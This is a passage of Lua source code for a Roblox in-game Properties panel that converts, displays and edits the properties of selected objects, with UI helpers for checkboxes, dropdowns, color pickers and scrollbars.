local bindGetSelection = ExplorerFrame.GetSelection
local bindSelectionChanged = ExplorerFrame.SelectionChanged
local bindGetApi = PropertiesFrame.GetApi
local bindGetAwait = PropertiesFrame.GetAwaiting
local bindSetAwait = PropertiesFrame.SetAwaiting

local ContentUrl = ContentProvider.BaseUrl .. "asset/?id="

local SettingsRemote = Gui:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")

local propertiesSearch = PropertiesFrame.Header.TextBox

local AwaitingObjectValue = false
local AwaitingObjectObj
local AwaitingObjectProp

function searchingProperties()
	if propertiesSearch.Text ~= "" and propertiesSearch.Text ~= "Search Properties" then
		return true
	end
	return false
end

local function GetSelection()
	local selection = bindGetSelection:Invoke()
	if #selection == 0 then
		return nil
	else
		return selection
	end 
end

-- Number

local function Round(number, decimalPlaces)
	return tonumber(string.format("%." .. (decimalPlaces or 0) .. "f", number))
end

-- Strings

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

-- Data Type Handling

local function ToString(value, type)
	if type == "float" then
		return tostring(Round(value,2))
	elseif type == "Content" then
		if string.find(value,"/asset") then
			local match = string.find(value, "=") + 1
			local id = string.sub(value, match)
			return id
		else
			return tostring(value)
		end
	elseif type == "Vector2" then
		local x = value.x
		local y = value.y
		return string.format("%g, %g", x,y)
	elseif type == "Vector3" then
		local x = value.x
		local y = value.y
		local z = value.z
		return string.format("%g, %g, %g", x,y,z)
	elseif type == "Color3" then
		local r = value.r
		local g = value.g
		local b = value.b
		return string.format("%d, %d, %d", r*255,g*255,b*255)
	elseif type == "UDim2" then
		local xScale = value.X.Scale
		local xOffset = value.X.Offset
		local yScale = value.Y.Scale
		local yOffset = value.Y.Offset
		return string.format("{%d, %d}, {%d, %d}", xScale, xOffset, yScale, yOffset)
	else
		return tostring(value)
	end
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		if tonumber(value) ~= nil then
			value = ContentUrl .. value
		end
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	else
		return nil
	end
end


-- Tables

local function CopyTable(T)
  local t2 = {}
  for k,v in pairs(T) do
    t2[k] = v
  end
  return t2
end

local function SortTable(T)
	table.sort(T, 
		function(x,y) return x.Name < y.Name
	end)
end

-- Spritesheet
local Sprite = {
	Width = 13;
	Height = 13;
}

local Spritesheet = {
	Image = "http://www.roblox.com/asset/?id=128896947";
	Height = 256;
	Width = 256;
}

local Images = {
	"unchecked",
	"checked",
	"unchecked_over",
	"checked_over",
	"unchecked_disabled",
	"checked_disabled"
}

local function SpritePosition(spriteName)
	local x = 0
	local y = 0
	for i,v in pairs(Images) do
		if (v == spriteName) then
			return {x, y}
		end
		x = x + Sprite.Height
		if (x + Sprite.Width) > Spritesheet.Width then
			x = 0
			y = y + Sprite.Height
		end
	end
end

local function GetCheckboxImageName(checked, readOnly, mouseover)
	if checked then
		if readOnly then
			return "checked_disabled"
		elseif mouseover then
			return "checked_over"
		else
			return "checked"
		end
	else
		if readOnly then
			return "unchecked_disabled"
		elseif mouseover then
			return "unchecked_over"
		else
			return "unchecked"
		end
	end
end

local MAP_ID = 418720155

-- Gui Controls --

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

local function CreateCell()
	local tableCell = Instance.new("Frame")
	tableCell.Size = UDim2.new(0.5, -1, 1, 0)
	tableCell.BackgroundColor3 = Row.BackgroundColor
	tableCell.BorderColor3 = Row.BorderColor
	return tableCell
end
	
local function CreateLabel(readOnly)
	local label = Instance.new("TextLabel")
	label.Font = Row.Font
	label.FontSize = Row.FontSize
	label.TextXAlignment = Row.TextXAlignment
	label.BackgroundTransparency = 1
	
	if readOnly then
		label.TextColor3 = Row.TextLockedColor
	else
		label.TextColor3 = Row.TextColor
	end
	return label
end

local function CreateTextButton(readOnly, onClick)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
		button.MouseButton1Click:connect(function()
			onClick()
		end)
	end
	return button
end

local function CreateObject(readOnly)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
	end
	local cancel = Create(Icon('ImageButton',177),{
		Name = "Cancel";
		Visible = false;
		Position = UDim2.new(1,-20,0,0);
		Size = UDim2.new(0,20,0,20);
		Parent = button;
	})
	return button
end

local function CreateTextBox(readOnly)
	if readOnly then
		local box = CreateLabel(readOnly)
		return box
	else
		local box = Instance.new("TextBox")
		if not SettingsRemote:Invoke("ClearProps") then
			box.ClearTextOnFocus = false
		end
		box.Font = Row.Font
		box.FontSize = Row.FontSize
		box.TextXAlignment = Row.TextXAlignment
		box.BackgroundTransparency = 1
		box.TextColor3 = Row.TextColor
		return box
	end
end

local function CreateDropDownItem(text, onClick)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		onClick(text)
	end)	
	return button
end

local function CreateDropDown(choices, currentChoice, readOnly, onClick)
	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	
	local function showArrow(color)
		if arrow then arrow:Destroy() end
		
		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = color;
		})
		local graphicSize = 16/2
		
		arrow = ArrowGraphic(graphicSize,'Down',true,graphicTemplate)
		arrow.Position = UDim2.new(1,-graphicSize * 2,0.5,-graphicSize/2)
		arrow.Parent = frame
	end
	
	local function hideMenu()
		expanded = false
		showArrow(DropDown.ArrowColor)
		if menu then menu:Destroy() end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(1, -2 * margin, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, Row.Height + margin)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		local parentFrameHeight = menu.Parent.Parent.Parent.Parent.Size.Y.Offset
		local rowHeight = menu.Parent.Parent.Parent.Position.Y.Offset
		if (rowHeight + menu.Size.Y.Offset) > math.max(parentFrameHeight,PropertiesFrame.AbsoluteSize.y) then
			menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateDropDownItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 16)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end
	
	showArrow(DropDown.ArrowColor)
	
	if not readOnly then
		
		button.MouseEnter:connect(function()
			button.TextColor3 = Row.TextColor
			showArrow(DropDown.ArrowColorOver)
		end)
		button.MouseLeave:connect(function()
			button.TextColor3 = Row.TextColor
			if not expanded then
				showArrow(DropDown.ArrowColor)
			end
		end)
		button.MouseButton1Click:connect(function()
			if expanded then
				hideMenu()
			else
				showMenu()
			end
		end)
	end
	
	return frame,button
end

local function CreateBrickColor(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorPalette = Instance.new("Frame")
	colorPalette.BackgroundTransparency = 0
	colorPalette.SizeConstraint = Enum.SizeConstraint.RelativeXX
	colorPalette.Size = UDim2.new(1, -2 * BrickColors.OuterBorder, 1, -2 * BrickColors.OuterBorder)
	colorPalette.BorderSizePixel = BrickColors.BorderSizePixel
	colorPalette.BorderColor3 = BrickColors.BorderColor
	colorPalette.Position = UDim2.new(0, BrickColors.OuterBorder, 0, BrickColors.OuterBorder + Row.Height)
	colorPalette.ZIndex = 5
	colorPalette.Visible = false
	colorPalette.BorderSizePixel = BrickColors.OuterBorder
	colorPalette.BorderColor3 = BrickColors.OuterBorderColor
	colorPalette.Parent = frame
	
	local function show()
		colorPalette.Visible = true
	end
	
	local function hide()
		colorPalette.Visible = false
	end
	
	local function toggle()
		colorPalette.Visible = not colorPalette.Visible
	end
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.MouseButton1Click:connect(function()
		if not readOnly then
			toggle()
		end
	end)
	
	if readOnly then
		colorBox.AutoButtonColor = false
	end
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	
	local propertyLabel = CreateTextButton(readOnly, function()
		if not readOnly then
			toggle()
		end
	end)
	propertyLabel.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	propertyLabel.Position = UDim2.new(0, spacingBefore, 0, 0)
	propertyLabel.Parent = frame
	
	local size = (1 / BrickColors.ColorsPerRow)
	
	for index = 0, 127 do
		local brickColor = BrickColor.palette(index)
		local color3 = brickColor.Color
		
		local x = size * (index % BrickColors.ColorsPerRow)
		local y = size * math.floor(index / BrickColors.ColorsPerRow)
	
		local brickColorBox = Instance.new("TextButton")
		brickColorBox.Text = ""
		brickColorBox.Size = UDim2.new(size,0,size,0)
		brickColorBox.BackgroundColor3 = color3
		brickColorBox.Position = UDim2.new(x, 0, y, 0)
		brickColorBox.ZIndex = colorPalette.ZIndex
		brickColorBox.Parent = colorPalette
	
		brickColorBox.MouseButton1Click:connect(function()
			hide()
			onClick(brickColor)
		end)
	end
	
	return frame,propertyLabel,colorBox
end

local function CreateColor3Control(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.AutoButtonColor = false
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, spacingBefore, 0, 0)
	box.Parent = frame
	
	return frame,box,colorBox
end

function CreateCheckbox(value, readOnly, onClick)
	local checked = value
	local mouseover = false

	local checkboxFrame = Instance.new("ImageButton")
	checkboxFrame.Size = UDim2.new(0, Sprite.Width, 0, Sprite.Height)
	checkboxFrame.BackgroundTransparency = 1
	checkboxFrame.ClipsDescendants = true
	--checkboxFrame.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

	local spritesheetImage = Instance.new("ImageLabel", checkboxFrame)
	spritesheetImage.Name = "SpritesheetImageLabel"
	spritesheetImage.Size = UDim2.new(0, Spritesheet.Width, 0, Spritesheet.Height)
	spritesheetImage.Image = Spritesheet.Image
	spritesheetImage.BackgroundTransparency = 1
	
	local function updateSprite()
		local spriteName = GetCheckboxImageName(checked, readOnly, mouseover)
		local spritePosition = SpritePosition(spriteName)
		spritesheetImage.Position = UDim2.new(0, -1 * spritePosition[1], 0, -1 * spritePosition[2])
	end
	
	local function setValue(val)
		checked = val
		updateSprite()
	end

	if not readOnly then
		checkboxFrame.MouseEnter:connect(function() mouseover = true updateSprite() end)
		checkboxFrame.MouseLeave:connect(function() mouseover = false updateSprite() end)
		checkboxFrame.MouseButton1Click:connect(function()
			onClick(checked)
		end)
	end
	
	updateSprite()
	
	return checkboxFrame, setValue
end



-- Code for handling controls of various data types --

local Controls = {}

Controls["default"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.FocusLost:connect(function(enterPressed)
			Set(object, propertyData, ToValue(box.Text,propertyType))
			update()
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return box
end

Controls["bool"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local checked = object[propertyName]
	
	local checkbox, setValue = CreateCheckbox(checked, readOnly, function(value)
		Set(object, propertyData, not checked)
	end)
	checkbox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	
	setValue(checked)
	
	local function update()
		checked = object[propertyName]
		setValue(checked)
	end
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("BoolValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	update()
	
	return checkbox
end

Controls["BrickColor"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,label,brickColorBox = CreateBrickColor(readOnly, function(brickColor)
		Set(object, propertyData, brickColor)
	end)
	
	local function update()
		local value = object[propertyName]
		brickColorBox.BackgroundColor3 = value.Color
		label.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Color3"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,textBox,colorBox = CreateColor3Control(readOnly)
	
	textBox.FocusLost:connect(function(enterPressed)
		Set(object, propertyData, ToValue(textBox.Text,"Color3"))
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end)
			
	local function update()
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Enum"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local enumName = object[propertyName].Name
	
	local enumNames = {}
	for _,enum in pairs(Enum[tostring(propertyType)]:GetEnumItems()) do
		table.insert(enumNames, enum.Name)
	end
	
	local dropdown, propertyLabel = CreateDropDown(enumNames, enumName, readOnly, function(value)
		Set(object, propertyData, value)
	end)
	--dropdown.Parent = frame
	
	local function update()
		local value = object[propertyName].Name
		propertyLabel.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return dropdown
end

Controls["Object"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateObject(readOnly,function()end)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		if AwaitingObjectObj == object then
			if AwaitingObjectValue == true then
				box.Text = "Select an Object"
				return
			end
		end
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.MouseButton1Click:connect(function()
			if AwaitingObjectValue then
				AwaitingObjectValue = false
				update()
				return
			end
			AwaitingObjectValue = true
			AwaitingObjectObj = object
			AwaitingObjectProp = propertyData
			box.Text = "Select an Object"
		end)
		
		box.Cancel.Visible = true
		box.Cancel.MouseButton1Click:connect(function()
			object[propertyName] = nil
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("ObjectValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	return box
end

function GetControl(object, propertyData, readOnly)
	local propertyType = propertyData["ValueType"]
	local control = nil
	
	if Controls[propertyType] then
		control = Controls[propertyType](object, propertyData, readOnly)
	elseif RbxApi.IsEnum(propertyType) then
		control = Controls["Enum"](object, propertyData, readOnly)
	else
		control = Controls["default"](object, propertyData, readOnly)
	end
	return control
end
-- Permissions

function CanEditObject(object)
	local player = Players.LocalPlayer
	local character = player.Character
	return Permissions.CanEdit
end

function CanEditProperty(object,propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "readonly" then
			return false
		end
	end
	return CanEditObject(object)
end

--RbxApi
local function PropertyIsHidden(propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

function Set(object, propertyData, value)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	if value == nil then return end
	
	for i,v in pairs(GetSelection()) do
		if CanEditProperty(v,propertyData) then
			pcall(function()
				--print("Setting " .. propertyName .. " to " .. tostring(value))
				v[propertyName] = value
			end)
		end
	end
end

function CreateRow(object, propertyData, isAlternateRow)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	local propertyValue = object[propertyName]
	--rowValue, rowValueType, isAlternate
	local backColor = Row.BackgroundColor;
	if (isAlternateRow) then
		backColor = Row.BackgroundColorAlternate
	end
	
	local readOnly = not CanEditProperty(object, propertyData)
	if propertyType == "Instance" or propertyName == "Parent" then readOnly = true end

	local rowFrame = Instance.new("Frame")
	rowFrame.Size = UDim2.new(1,0,0,Row.Height)
	rowFrame.BackgroundTransparency = 1
	rowFrame.Name = 'Row'

	local propertyLabelFrame = CreateCell()
	propertyLabelFrame.Parent = rowFrame
	propertyLabelFrame.ClipsDescendants = true
	
	local propertyLabel = CreateLabel(readOnly)
	propertyLabel.Text = propertyName
	propertyLabel.Size = UDim2.new(1, -1 * Row.TitleMarginLeft, 1, 0)
	propertyLabel.Position = UDim2.new(0, Row.TitleMarginLeft, 0, 0)
	propertyLabel.Parent = propertyLabelFrame

	local propertyValueFrame = CreateCell()
	propertyValueFrame.Size = UDim2.new(0.5, -1, 1, 0)
	propertyValueFrame.Position = UDim2.new(0.5, 0, 0, 0)
	propertyValueFrame.Parent = rowFrame

	local control = GetControl(object, propertyData, readOnly)
	control.Parent = propertyValueFrame

	rowFrame.MouseEnter:connect(function()
		propertyLabelFrame.BackgroundColor3 = Row.BackgroundColorMouseover
		propertyValueFrame.BackgroundColor3 = Row.BackgroundColorMouseover
	end)
	rowFrame.MouseLeave:connect(function()
		propertyLabelFrame.BackgroundColor3 = backColor
		propertyValueFrame.BackgroundColor3 = backColor
	end)
	
	propertyLabelFrame.BackgroundColor3 = backColor
	propertyValueFrame.BackgroundColor3 = backColor
	
	return rowFrame
end

function ClearPropertiesList()
	for _,instance in pairs(ContentFrame:GetChildren()) do
		instance:Destroy()
	end
end

local selection = Gui:FindFirstChild("Selection", 1)
print(selection)

function displayProperties(props)
	for i,v in pairs(props) do
		pcall(function()
			local a = CreateRow(v.object, v.propertyData, ((numRows % 2) == 0))
			a.Position = UDim2.new(0,0,0,numRows*Row.Height)
			a.Parent = ContentFrame
			numRows = numRows + 1
		end)
	end
end

function checkForDupe(prop,props)
	for i,v in pairs(props) do
		if v.propertyData.Name == prop.Name and v.propertyData.ValueType == prop.ValueType then
			return true
		end
	end
	return false
end

function sortProps(t)
	table.sort(t, 
		function(x,y) return x.propertyData.Name < y.propertyData.Name
	end)
end

function showProperties(obj)
	ClearPropertiesList()
	if obj == nil then return end
	local propHolder = {}
	local foundProps = {}
	numRows = 0
	for _,nextObj in pairs(obj) do
		if not foundProps[nextObj.className] then
			foundProps[nextObj.className] = true
			for i,v in pairs(RbxApi.GetProperties(nextObj.className)) do
				local suc, err = pcall(function()
					if not (PropertyIsHidden(v)) and not checkForDupe(v,propHolder) then
						if string.find(string.lower(v.Name),string.lower(propertiesSearch.Text)) or not searchingProperties() then
							table.insert(propHolder,{propertyData = v, object = nextObj})
						end
					end
				end)
				--[[if not suc then 
					warn("Problem getting the value of property " .. v.Name .. " | " .. err)
				end	--]]
			end
		end
	end
	sortProps(propHolder)
	displayProperties(propHolder)
	ContentFrame.Size = UDim2.new(1, 0, 0, numRows * Row.Height)
	scrollBar.ScrollIndex = 0
	scrollBar.TotalSpace = numRows * Row.Height
	scrollBar.Update()
end

----------------------------------------------------------------
-----------------------SCROLLBAR STUFF--------------------------
----------------------------------------------------------------
----------------------------------------------------------------
local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
